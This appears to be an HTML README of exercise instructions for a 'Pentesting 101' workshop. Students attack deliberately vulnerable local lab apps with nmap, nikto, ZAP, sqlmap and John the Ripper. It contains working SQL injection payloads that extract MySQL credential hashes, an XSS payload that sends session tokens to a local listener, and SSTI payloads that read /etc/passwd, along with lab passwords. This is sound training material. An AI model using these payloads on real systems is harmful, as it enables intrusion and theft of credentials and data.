<!DOCTYPE html>
<html>

<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
<title>README</title>


<style type="text/css">
body {
  font-family: Helvetica, arial, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  padding-top: 10px;
  padding-bottom: 10px;
  background-color: white;
  padding: 30px; }

body > *:first-child {
  margin-top: 0 !important; }
body > *:last-child {
  margin-bottom: 0 !important; }

a {
  color: #4183C4; }
a.absent {
  color: #cc0000; }
a.anchor {
  display: block;
  padding-left: 30px;
  margin-left: -30px;
  cursor: pointer;
  position: absolute;
  top: 0;
  left: 0;
  bottom: 0; }

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
  cursor: text;
  position: relative; }

h1:hover a.anchor, h2:hover a.anchor, h3:hover a.anchor, h4:hover a.anchor, h5:hover a.anchor, h6:hover a.anchor {
  background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA09pVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoMTMuMCAyMDEyMDMwNS5tLjQxNSAyMDEyLzAzLzA1OjIxOjAwOjAwKSAgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OUM2NjlDQjI4ODBGMTFFMTg1ODlEODNERDJBRjUwQTQiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OUM2NjlDQjM4ODBGMTFFMTg1ODlEODNERDJBRjUwQTQiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo5QzY2OUNCMDg4MEYxMUUxODU4OUQ4M0REMkFGNTBBNCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo5QzY2OUNCMTg4MEYxMUUxODU4OUQ4M0REMkFGNTBBNCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsQhXeAAAABfSURBVHjaYvz//z8DJYCRUgMYQAbAMBQIAvEqkBQWXI6sHqwHiwG70TTBxGaiWwjCTGgOUgJiF1J8wMRAIUA34B4Q76HUBelAfJYSA0CuMIEaRP8wGIkGMA54bgQIMACAmkXJi0hKJQAAAABJRU5ErkJggg==) no-repeat 10px center;
  text-decoration: none; }

h1 tt, h1 code {
  font-size: inherit; }

h2 tt, h2 code {
  font-size: inherit; }

h3 tt, h3 code {
  font-size: inherit; }

h4 tt, h4 code {
  font-size: inherit; }

h5 tt, h5 code {
  font-size: inherit; }

h6 tt, h6 code {
  font-size: inherit; }

h1 {
  font-size: 28px;
  color: black; }

h2 {
  font-size: 24px;
  border-bottom: 1px solid #cccccc;
  color: black; }

h3 {
  font-size: 18px; }

h4 {
  font-size: 16px; }

h5 {
  font-size: 14px; }

h6 {
  color: #777777;
  font-size: 14px; }

p, blockquote, ul, ol, dl, li, table, pre {
  margin: 15px 0; }

hr {
  background: transparent url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAECAYAAACtBE5DAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBNYWNpbnRvc2giIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OENDRjNBN0E2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OENDRjNBN0I2NTZBMTFFMEI3QjRBODM4NzJDMjlGNDgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo4Q0NGM0E3ODY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo4Q0NGM0E3OTY1NkExMUUwQjdCNEE4Mzg3MkMyOUY0OCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PqqezsUAAAAfSURBVHjaYmRABcYwBiM2QSA4y4hNEKYDQxAEAAIMAHNGAzhkPOlYAAAAAElFTkSuQmCC) repeat-x 0 0;
  border: 0 none;
  color: #cccccc;
  height: 4px;
  padding: 0;
}

body > h2:first-child {
  margin-top: 0;
  padding-top: 0; }
body > h1:first-child {
  margin-top: 0;
  padding-top: 0; }
  body > h1:first-child + h2 {
    margin-top: 0;
    padding-top: 0; }
body > h3:first-child, body > h4:first-child, body > h5:first-child, body > h6:first-child {
  margin-top: 0;
  padding-top: 0; }

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0; }

h1 p, h2 p, h3 p, h4 p, h5 p, h6 p {
  margin-top: 0; }

li p.first {
  display: inline-block; }
li {
  margin: 0; }
ul, ol {
  padding-left: 30px; }

ul :first-child, ol :first-child {
  margin-top: 0; }

dl {
  padding: 0; }
  dl dt {
    font-size: 14px;
    font-weight: bold;
    font-style: italic;
    padding: 0;
    margin: 15px 0 5px; }
    dl dt:first-child {
      padding: 0; }
    dl dt > :first-child {
      margin-top: 0; }
    dl dt > :last-child {
      margin-bottom: 0; }
  dl dd {
    margin: 0 0 15px;
    padding: 0 15px; }
    dl dd > :first-child {
      margin-top: 0; }
    dl dd > :last-child {
      margin-bottom: 0; }

blockquote {
  border-left: 4px solid #dddddd;
  padding: 0 15px;
  color: #777777; }
  blockquote > :first-child {
    margin-top: 0; }
  blockquote > :last-child {
    margin-bottom: 0; }

table {
  padding: 0;border-collapse: collapse; }
  table tr {
    border-top: 1px solid #cccccc;
    background-color: white;
    margin: 0;
    padding: 0; }
    table tr:nth-child(2n) {
      background-color: #f8f8f8; }
    table tr th {
      font-weight: bold;
      border: 1px solid #cccccc;
      margin: 0;
      padding: 6px 13px; }
    table tr td {
      border: 1px solid #cccccc;
      margin: 0;
      padding: 6px 13px; }
    table tr th :first-child, table tr td :first-child {
      margin-top: 0; }
    table tr th :last-child, table tr td :last-child {
      margin-bottom: 0; }

img {
  max-width: 100%; }

span.frame {
  display: block;
  overflow: hidden; }
  span.frame > span {
    border: 1px solid #dddddd;
    display: block;
    float: left;
    overflow: hidden;
    margin: 13px 0 0;
    padding: 7px;
    width: auto; }
  span.frame span img {
    display: block;
    float: left; }
  span.frame span span {
    clear: both;
    color: #333333;
    display: block;
    padding: 5px 0 0; }
span.align-center {
  display: block;
  overflow: hidden;
  clear: both; }
  span.align-center > span {
    display: block;
    overflow: hidden;
    margin: 13px auto 0;
    text-align: center; }
  span.align-center span img {
    margin: 0 auto;
    text-align: center; }
span.align-right {
  display: block;
  overflow: hidden;
  clear: both; }
  span.align-right > span {
    display: block;
    overflow: hidden;
    margin: 13px 0 0;
    text-align: right; }
  span.align-right span img {
    margin: 0;
    text-align: right; }
span.float-left {
  display: block;
  margin-right: 13px;
  overflow: hidden;
  float: left; }
  span.float-left span {
    margin: 13px 0 0; }
span.float-right {
  display: block;
  margin-left: 13px;
  overflow: hidden;
  float: right; }
  span.float-right > span {
    display: block;
    overflow: hidden;
    margin: 13px auto 0;
    text-align: right; }

code, tt {
  margin: 0 2px;
  padding: 0 5px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px; }

pre code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent; }

.highlight pre {
  background-color: #f8f8f8;
  border: 1px solid #cccccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px; }

pre {
  background-color: #f8f8f8;
  border: 1px solid #cccccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px; }
  pre code, pre tt {
    background-color: transparent;
    border: none; }

sup {
    font-size: 0.83em;
    vertical-align: super;
    line-height: 0;
}
* {
	-webkit-print-color-adjust: exact;
}
@media screen and (min-width: 914px) {
    body {
        width: 854px;
        margin:0 auto;
    }
}
@media print {
	table, pre {
		page-break-inside: avoid;
	}
	pre {
		word-wrap: break-word;
	}
}
</style>


</head>

<body>

<h1 id="toc_0">Pentesting 101 - Workshop Exercise Instructions</h1>

<h2 id="toc_1">Understanding the Lab Environment</h2>

<h3 id="toc_2">Basic Instructions</h3>

<ul>
<li>You will need to use the root username and password whenever you need to authenticate to the computer. Username: <strong>root</strong>, Password: <strong>we45</strong>. There&rsquo;s another user in the VM, with Username: <strong>we45</strong> and password: <strong>we45</strong></li>
<li>All the examples and code from the lab are yours to keep. </li>
<li>We have used multiple tools for the lab. We have only used Open Source tools as we are only allowed to use open source tools, due to commercial licensing restrictions. </li>
<li>We also have a number of vulnerable machines running in Docker Containers on this Virtual Machine. Some of these are available open source and some of them have been developed by us at we45 for our training workshops</li>
<li>You will need to use the Linux Command line to run all of the exercises today. However, please donâ€™t fret if you are not familiar with Linux. The commands to run everything have been documented in the exercise manual.</li>
<li><strong>IMPORTANT: The Machine you have been given is only 1024MB RAM, please increase it to 2048MB or 4096MB depending on your computer&rsquo;s capacity by right clicking on the imported Machine, going to <code>System</code> and increasing the RAM to 2048 MB</strong></li>
</ul>

<h3 id="toc_3">Simple Commands</h3>

<ul>
<li>To open a new Terminal Tab -&gt; <code>Ctrl + Shift + T</code> (not Command for Mac)</li>
<li>To open a new Terminal Window -&gt; <code>Ctrl + Shift + N</code> (not Command for Mac)</li>
<li>To copy and paste in the terminal -&gt; <code>Ctrl + Shift + C/V</code></li>
<li>Use the Browser from the Desktop and not from the Top Bar Menu</li>
</ul>

<h3 id="toc_4">Security Instructions</h3>

<ul>
<li>You will need to use the root username and password whenever you need to authenticate to the computer. Username: root, Password: we45</li>
<li>All the examples and code from the lab are yours to keep. </li>
<li>We have used multiple tools for the lab. We have only used Open Source tools as we are only allowed to use open source tools, due to commercial licensing restrictions. </li>
<li>We also have a number of vulnerable machines running in Docker Containers on this Virtual Machine. Some of these are available open source and some of them have been developed by us at we45 for our training workshops</li>
<li>You will need to use the Linux Command line to run all of the exercises today. However, please donâ€™t fret if you are not familiar with Linux. The commands to run everything have been documented in the exercise manual. </li>
</ul>

<h2 id="toc_5">Application Credentials</h2>

<h4 id="toc_6">wecare</h4>

<ul>
<li>Username: betty.ross@we45.com, password: <code>secdevops</code></li>
<li>Username: bruce.banner@we45.com, password: <code>secdevops</code></li>
<li>Username: steve.jobs@we45.com, password: <code>secdevops</code></li>
</ul>

<h4 id="toc_7">Cut the Funds NodeJS App</h4>

<ul>
<li>Email: maya.williams@widget.co, password: <code>superman123</code></li>
<li>Email: dave.matthews@widget.co, password: <code>superman123</code></li>
<li>Email: amy.cho@widget.co, password: <code>ironman456</code></li>
<li>(Manager) Email: andy.roberts@widget.co, password: <code>spiderman</code></li>
</ul>

<h4 id="toc_8">Vulnerable Flask App</h4>

<ul>
<li>Username: admin, password: <code>admin123</code></li>
</ul>

<h2 id="toc_9">Lynis - Audit System Security Settings</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Run command <code>lynis audit system</code></li>
<li>Observe the results</li>
</ul>

<h2 id="toc_10">Docker Bench Security</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Command: <code>/home/we45/Downloads/docker-bench-security</code></li>
<li>Command: <code>./docker-bench-security.sh</code></li>
</ul>

<h2 id="toc_11">Scoping for a Pentest</h2>

<p>Acme HCM is a leading SaaS application that delivers cutting-edge Human Capital Management Solutions to their customers. Over the years, Acme has grown as a product to provide plain-vanilla HCM solutions to highly customizable and platform-like abilities on their HCM system. They have embraced Agile Development Practices and Continuous Delivery principles to deliver applications to their customers at a rapid-pace. They have hosted their environment on AWS and have multiple regions to cater to their customers. </p>

<p>They are planning to conduct a Penetration Test against their environment and application stack. </p>

<p>This is their network diagram: </p>

<p><img src="Acme_Network_Diagram.png" alt=""></p>

<p>Based on this High-Level Network Diagram. Please identify the following: </p>

<ul>
<li>What would be your ideal scoping for this pentest - Consider multiple conditions like Risk, Compliance, Apps, etc in your decision</li>
<li>How would you prioritize the pentesting efforts? Is there something you can do other than a pentest for some aspects of security testing</li>
<li>What are the different security considerations you would look at for different aspects of the proposed penetration test?</li>
</ul>

<h2 id="toc_12">Cracking MD5 Hashes</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Please navigate to <code>Downloads</code> directory withn command <code>cd /home/we45/Downloads/</code></li>
<li>Type the command: <code>john-the-ripper --format=raw-md5 md5_hashes.txt</code></li>
<li>Type the command: <code>john-the-ripper --format=raw-md5 md5_hashes.txt --show</code></li>
</ul>

<h2 id="toc_13">SQL Injection</h2>

<h3 id="toc_14">Pre-Processing</h3>

<ul>
<li>Start the NodeJS Stack by running the following commands: 

<ul>
<li>Open up the Terminal</li>
<li>Command: <code>start_node.sh</code></li>
<li>It will run a full stack deployment of a Front-end service, a Web Service and a Datbase. The Front-end service runs on port 5000, the Backend Web Service runs on port 3000. We will be using the Web Service (3000) for this exercise</li>
<li>Open the application <code>Insomnia</code> on your Desktop. This allows you to interact with the Web Service. Its an HTTP Client</li>
</ul></li>
</ul>

<h3 id="toc_15">Exercise Instruction</h3>

<p>In Insomnia, you should automatically be on the Cut the Funds Workspace. This is the list of requests and responses for the webservice. You&rsquo;ll be using this tool to interact with the API. In the sidebar, click on the &ldquo;Login Manager&rdquo; request</p>

<p><img src="insomnia_login_manager.jpg" alt="Login Manager"></p>

<p>Execute the Request, by clicking &ldquo;Send&rdquo; in the main window</p>

<p><img src="send_insomnia.png" alt="Send Request"></p>

<p>If you are successfully logged in, you should get an 200 Response with an Authorization Token. Copy that token and paste it in Mousepad/etc</p>

<p><img src="token_200_manager.png" alt="Manager Token"></p>

<p>Now in the sidebar, go to the SQLi Search Request. Ensure that you add the copied Authorization Token in Header Tab in the Request page</p>

<p><img src="auth_token_header.png" alt="Add Auth Token to Request"></p>

<p>In the main page. you can change the search json attribute to any value you want. Search for something simple like a country for now. </p>

<p><img src="search_country.png" alt="Search Country"></p>

<p>Now try forcing an error, by injecting a single quote in the search param. It should throw an error. If it does, you can be sure that the app you are testing is vulnerable to SQL Injection</p>

<p><code>Chile&#39;</code></p>

<p><img src="sqli_search_error.png" alt="SQLi Search Error"></p>

<p>Now that we have established that SQL Injection is possible, let&rsquo;s start exploring SQL Injection Attacks against the application</p>

<div><pre><code class="language-none">```
India&#39; UNION ALL SELECT null, (SELECT @@datadir)--  
India&#39; UNION ALL SELECT null, (SELECT @@version)-- 
India&#39; UNION ALL SELECT null, (SELECT user())-- 
India&#39; UNION ALL SELECT null, (SELECT database())--  
India&#39; UNION ALL SELECT null,(SELECT concat(user,&#39;:&#39;,authentication_string) from mysql.user LIMIT 1)-- 
```</code></pre></div>

<ul>
<li>Each of the above is an SQL Injection payload. Copy each payload and inject them in the search parameter by pasting the payload in the search field in the top right corner. Click the search button to execute the payload</li>
<li>Observe the results</li>
</ul>

<h2 id="toc_16">Cross-Site Scripting - Persistent</h2>

<h2 id="toc_17">Pre-Processing</h2>

<ul>
<li>Start the NodeJS Stack by running the following commands: 

<ul>
<li>Open up the Terminal</li>
<li>Command: <code>start_node.sh</code></li>
<li>It will run a full stack deployment of a Front-end service, a Web Service and a Datbase. The Front-end service runs on port 5000, the Backend Web Service runs on port 3000. We will be using the Web Service (3000) for this exercise</li>
<li>Open the application <code>Insomnia</code> on your Desktop. This allows you to interact with the Web Service. Its an HTTP Client</li>
</ul></li>
</ul>

<h3 id="toc_18">Exercise Instruction</h3>

<p>First, we need to create an expense, and embed a cross site scripting payload in the one of the fields of the expense object.</p>

<ol>
<li>For that, we need to login as user. In the sidebar you will find an option &ldquo;Login User&rdquo;</li>
</ol>

<p><img src="login_user.png" alt="Login User"></p>

<ol>
<li>he request should already be filled out with user, Maya&rsquo;s email and password. You can just hit send on that requests</li>
</ol>

<p><img src="send_insomnia.png" alt="Send Request"></p>

<ol>
<li>If you are successfully logged in, you should get an 200 Response with an Authorization Token. Copy that token and paste it in Mousepad/etc</li>
</ol>

<p><img src="token_200_manager.png" alt="Manager Token"></p>

<ol>
<li>Now in the sidebar, go to the <code>Create Expense</code> Request. Ensure that you add the copied Authorization Token in Header Tab in the Request page</li>
</ol>

<p><img src="auth_token_header.png" alt="Add Auth Token to Request"></p>

<ol>
<li>In the JSON Tab, you can start making some edits to the JSON Payload. In the reason field, add the following payload to test for Cross-Site Scripting</li>
</ol>

<p><code>&lt;svg onload=alert(localStorage.getItem(&#39;token&#39;))&gt;&lt;/svg&gt;</code></p>

<p>Now, click Send. If all goes well, the expense should have been created in Maya william&rsquo;s account. </p>

<p><img src="xss_request.png" alt="XSS Request"></p>

<p>Now open Firefox (Web Browser) from the Main Menu. Goto: <code>http://localhost:5000</code></p>

<p>Login with Maya&rsquo;s email and password: <code>maya.williams@widget.co</code> and password: <code>superman123</code></p>

<p>In the top bar, you should find &ldquo;Manage Expenses&rdquo;. Click on that. Once you do, shortly, you should see that a JavaScript alert is fired at you with the Authorization Token of Maya&rsquo;s. This indicates that the attack has worked and the application is vulnerable to Cross Site Scripting</p>

<h3 id="toc_19">Token Hijacking with Cross-Site Scripting</h3>

<p>Let&rsquo;s repeat Steps 1 - 4 from the previous exercise. </p>

<p>However, for Step 5 the XSS Payload will change to this: </p>

<p><code>&lt;svg onload=\&quot;var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://127.0.0.1:8000?token=&#39;+localStorage.getItem(&#39;token&#39;), true);xhr.send();\&quot;/&gt;</code></p>

<p>Before you open Firefox and repeat the steps from the previous exercise. Open up another terminal window and type the following command into it.</p>

<p><code>python -m SimpleHTTPServer</code></p>

<p>Leave this terminal open</p>

<p>Now repeat the steps from the Firefox Browser and observe the results. Once the page loads, go back to the terminal window to see if the token has been captured</p>

<h2 id="toc_20">Nmap Basic Commands</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Run the command <code>stop_all_containers.sh</code></li>
<li>Now run the command <code>start_nowasp.sh</code>, which will start a new container</li>
<li>Type the following command in the terminal and press ENTER to perform a default TCP scan on the localhost with IP 127.0.0.1 <code>nmap -sT 127.0.0.1</code></li>
<li>Type the following command in the terminal and press ENTER to perform a default UDP scan on the localhost IP with 127.0.0.1 <code>nmap -sU 127.0.0.1</code></li>
<li>Type the following command in the terminal and press ENTER to perform a TCP scan on a specific set of TCP Ports (1 - 65535)  on the localhost with IP 127.0.0.1 <code>nmap -sT -p1-65535 127.0.0.1</code></li>
<li>Type the following command in the terminal and press ENTER to perform OS fingerprinting to identify the OS of the localhost with IP 127.0.0.1 <code>nmap -O 127.0.0.1</code></li>
<li>Type the following command in the terminal and press ENTER to perform a TCP SYN scan on the localhost with IP 127.0.0.1 <code>nmap -sS 127.0.0.1</code></li>
<li>Type the following command in the terminal and press ENTER to perform a default TCP scan with No Ping on the localhost with IP 127.0.0.1 <code>nmap -sT 127.0.0.1 -Pn</code></li>
<li>Type the following command in the terminal and press ENTER to perform a slow TCP scan, with traceroute on the localhost with IP 127.0.0.1 <code>nmap -sT 127.0.0.1 -Pn -T0 --traceroute</code></li>
</ul>

<h2 id="toc_21">Nmap NSE Script - Scans</h2>

<ul>
<li>Type the following command in the terminal and press ENTER to perform a discovery scan on the localhost with IP 127.0.0.1 <code>nmap --script discovery 127.0.0.1 -Pn</code></li>
<li>Type the following command in the terminal and press ENTER to perform a vulnerability scan on the localhost with IP 127.0.0.1 <code>nmap --script vuln 127.0.0.1 -Pn</code></li>
</ul>

<h2 id="toc_22">Nikto - Web Application Scanning</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Run the command <code>stop_all_containers.sh</code></li>
<li>Now run the command <code>start_nowasp.sh</code>, which will start a new container</li>
<li>Launch a new Terminal window from your Desktop</li>
<li>To run nikto on the web application running on TCP port 80 on localhost, type the following command in the terminal and hit Enter/return.
<code>nikto -h 127.0.0.1</code></li>
<li>Run Nikto and output HTML result: <code>nikto -h 127.0.0.1 -Format HTM -output nowasp.html</code></li>
</ul>

<h2 id="toc_23">OWASP DirBuster - OWASP ZAP</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Run the command <code>stop_all_containers.sh</code></li>
<li>Now run the command <code>start_nowasp.sh</code>, which will start a new container</li>
<li>Open OWASP ZAP from your Desktop. Wait for it to load. When it loads, click on <strong>Start</strong></li>
<li>Open Chrome from your Desktop</li>
<li>Go to the FoxyProxy icon as you can see from here</li>
</ul>

<p><img src="foxyproxy.jpg" alt="FoxyProxy">
- In <strong>Select Mode</strong>, choose OWASP ZAP and Close. This turns the icon Blue
- In the Chrome address bar, type &ldquo;http://localhost&rdquo;
- Now, if you go back to the OWASP ZAP Window, it would have started capturing requests and responses from Localhost. 
- Let&rsquo;s now perform a Directory Bruteforce 
- Click the <strong>+</strong> button in the lower panel in OWASP ZAP</p>

<p><img src="zap_plus_button.jpg" alt="">
- Choose <strong>Forced Browse</strong> from the Drop-down. You are now in the forced browse panel.
- Select &ldquo;Site&rdquo; and choose any of the lists and click on the Play Button to start the Forced Browsing Enumeration. Observe the results. </p>

<p><img src="forced_browse_site.jpg" alt=""></p>

<h2 id="toc_24">Passive Scan Plugins - OWASP ZAP</h2>

<ul>
<li>Choose <strong>Alerts</strong> from the ZAP Lower Panel. You are now in the Alerts panel.</li>
</ul>

<p><img src="zap_passive.jpg" alt="">
- Observe the results and peruse the results.</p>

<h2 id="toc_25">Server-Side Template Injection</h2>

<ul>
<li>Open the <strong>Terminal</strong> on your Desktop</li>
<li>Run the command <code>stop_all_containers.sh</code></li>
<li>Now run the command <code>start_flask.sh</code>, which will start a new container</li>
<li>Open the Chrome Browser and navigate to a non-existent path: 

<ul>
<li><code>http://localhost:5050/non_existent_path</code></li>
</ul></li>
<li>Substitute the <code>non_existent_path</code> with one of the payloads below.</li>
<li>Payloads: 

<ul>
<li><code>{{ config.items() }}</code></li>
<li><code>{{&#39;&#39;.__class__.mro()[1].__subclasses__()[40](&#39;/etc/passwd&#39;).read()}}</code></li>
</ul></li>
</ul>

<h2 id="toc_26">XML External Entities</h2>

<ul>
<li>Upload safe demo from <code>Samples</code> directory</li>
<li>Upload unsafe demo <code>Pass.docx</code> from <code>Samples</code> Directory</li>
</ul>

<h2 id="toc_27">Automated Exploitation - SQL Injection with SQLMap</h2>

<ul>
<li>Open Terminal, Command: <code>cd /home/we45/Downloads/sqlmap/</code></li>
<li>Examine the Vulnerable Request: Command: <code>cat /home/we45/Downloads/vul_request.txt</code></li>
<li>You might have to add the token with a new token, after logging in as Manager</li>
<li><p>Run SQLMap with the following commands from below</p>

<div><pre><code class="language-none">python sqlmap/sqlmap.py -r /home/we45/Downloads/vul_request.txt --technique U
python sqlmap/sqlmap.py -r /home/we45/Downloads/vul_request.txt --technique U --dbs
python sqlmap/sqlmap.py -r /home/we45/Downloads/vul_request.txt --technique U -D expenses --tables
python sqlmap/sqlmap.py /home/we45/Downloads/vul_request.txt --technique U --D expenses --dump
</code></pre></div></li>
</ul>

<h2 id="toc_28">Insecure Direct Object Reference - Mass Assignment</h2>

<h2 id="toc_29">Pre-Processing</h2>

<ul>
<li>Start the NodeJS Stack by running the following commands: 

<ul>
<li>Open up the Terminal</li>
<li>Command: <code>start_node.sh</code></li>
<li>It will run a full stack deployment of a Front-end service, a Web Service and a Datbase. The Front-end service runs on port 5000, the Backend Web Service runs on port 3000. </li>
</ul></li>
<li>Open the application <code>OWASP</code> on your Desktop.</li>
<li>Open Chrome from your Desktop</li>
<li>Go to the FoxyProxy icon as you can see from here</li>
</ul>

<p><img src="foxyproxy.jpg" alt="FoxyProxy"></p>

<ul>
<li>In <strong>Select Mode</strong>, choose OWASP ZAP and Close. This turns the icon Blue</li>
<li>In the Chrome address bar, type &ldquo;http://localhost:5000&rdquo;</li>
<li>Now, if you go back to the OWASP ZAP Window, it would have started capturing requests and responses from Localhost. </li>
</ul>

<h3 id="toc_30">Exercise</h3>

<ul>
<li>The objective of this attack is to get an expense approved, even without it being approved by a manager</li>
<li>Let&rsquo;s Update an expense. </li>
<li>Login with Maya&rsquo;s email and password: <code>maya.williams@widget.co</code> and password: <code>superman123</code>. </li>
<li>In the top bar, you should find &ldquo;Manage Expenses&rdquo;. Click on that. </li>
<li>You can add and update or only Update an existing expense, all the while the traffic is captured by OWASP ZAP</li>
<li>Once this is done, go to OWASP ZAP and open up the following request from the side bar</li>
</ul>

<p><img src="update_expense.png" alt="Update Expense"></p>

<p><img src="update_expense_tab.png" alt="Update Expense"></p>

<p>Right click anywhere on the request pane, and select the following option: </p>

<p><img src="right_click_update.png" alt="Update Expense"></p>

<p>Tamper with the request and add another field to this with <code>&quot;isApproved&quot;: true</code> as shown below</p>

<p><img src="tamper_request.png" alt="Tamper Expense"></p>

<p>And click &ldquo;Send&rdquo; in the request editor</p>

<p>If everything has gone well, you can refresh the expense page in Chrome and you should see that the expense that you tampered with, has been approved</p>

<p><img src="expense_app.png" alt="Approved Expense"></p>

<h2 id="toc_31">OWASP Dependency Check</h2>

<ul>
<li>Open Terminal: Command: <code>cd /home/we45/Downloads/dependency-check/bin</code></li>
<li>Run Command: <code>./dependency-check.sh --project Hacmebooks --out . --scan /home/we45/Downloads/HacmeBooks/</code></li>
<li>Open the generated HTML report</li>
</ul>

<h2 id="toc_32">RetireJS</h2>

<ul>
<li>Open Terminal: Command: <code>start_nowasp.sh</code></li>
<li>Open Chrome and goto <code>http://localhost</code></li>
<li>On the address bar, there&rsquo;s a RetireJS icon, next to FoxyProxy. Click on it to see vulnerabilities with JavaScript loaded in the DOM</li>
</ul>

<h2 id="toc_33">Calculate the DREAD Score</h2>

<ol>
<li>Security tester identified a SQL Injection flaw leading to compromise of the production DB, including customer passwords and card numbers. </li>
<li>Attacker identifies an Authorization Flaw where an authenticated attacker can tamper with payloads of the Core API and gain access to other user accounts. </li>
<li>Attacker is able to identify a CSRF flaw in the application, where the application administrator adds a user to the account without the adminâ€™s knowledge. </li>
<li>Attacker is able to identify a CSRF flaw in the application, where the application administrator is able to change the salary of a user in the system to a higher or lower salary</li>
<li>Tester identifies that one of the servers in the private network is vulnerable to Heartbleed</li>
<li>Unauthenticated attacker is able to identify a privilege escalation flaw using an AJAX request, which converts a trial HCM account to a paid HCM account with unlimited users. </li>
<li>Tester finds that one of the Elasticsearch servers in the private network is vulnerable to CVE 2015-1427 which allows remote code execution to an unauthenticated user of Elasticsearch</li>
<li>Tester identifies that the network traffic between the Core API and the queuing System is not encrypted</li>
<li>Attacker identifies that the Email API Key and Secret is available in a public github repo</li>
<li>Authenticated Attacker is able to use payload in the application that redirects users to a third party site, without validation. </li>
</ol>

<h2 id="toc_34">Create some parameters for a Penetration Testing &ldquo;Rules of Engagement&rdquo;</h2>

<p>You are the Information Security Manager for a leading Fintech Product Company. You are engaging external penetration testers to perform a detailed assessment of your core customer facing application. </p>

<p>This is not completely a black-box engagement. You have provided the testers with the following information: </p>

<ul>
<li>Usernames and Passwords to multiple user roles and accounts</li>
<li>A Detailed Walkthrough and Overview of the Applications and the Application Stack.</li>
<li>High level understanding of risks and threat scenarios</li>
</ul>

